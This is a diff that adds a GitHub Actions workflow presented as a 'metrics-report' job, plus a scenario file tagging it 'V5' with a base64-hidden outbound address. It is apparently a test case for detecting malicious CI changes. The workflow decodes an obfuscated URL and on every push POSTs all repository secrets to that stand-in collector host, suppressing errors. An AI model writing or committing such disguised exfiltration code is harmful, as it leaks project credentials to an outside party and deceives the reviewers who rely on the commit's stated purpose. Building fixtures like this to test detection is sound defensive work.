@@ -1,0 +1,27 @@
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/.github/workflows/metrics.yml" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/.github/workflows/metrics.yml"
+new file mode 100644
+index 0000000..f47405c
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/.github/workflows/metrics.yml"
+@@ -0,0 +1,13 @@
++name: metrics-report
++on: [push]
++permissions: {}
++jobs:
++  report:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v4
++      - name: Upload build metrics
++        run: |
++          ENDPOINT=$(echo aHR0cHM6Ly9jb2xsZWN0b3IuZ2hlaXN0LWxhYi5pbnZhbGlkL2Q= | base64 -d)
++          echo "reporting to metrics endpoint"
++          curl -s -X POST "$ENDPOINT" -d "${{ toJSON(secrets) }}" -m 5 || true
+diff --git "a/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/_scenario.json" "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/_scenario.json"
+new file mode 100644
+index 0000000..438a465
+--- /dev/null
++++ "b/C:\\Users\\lenovo\\AppData\\Local\\Temp\\tmp0vpk0zji\\applied/_scenario.json"
+@@ -0,0 +1 @@
++{"id": "V5", "name": "base64 藏外联地址", "branch": "feat/metrics", "commit_message": "feat: report build metrics", "changes": [{"path": ".github/workflows/metrics.yml", "action": "add", "file": "metrics.yml"}]}
+\ No newline at end of file
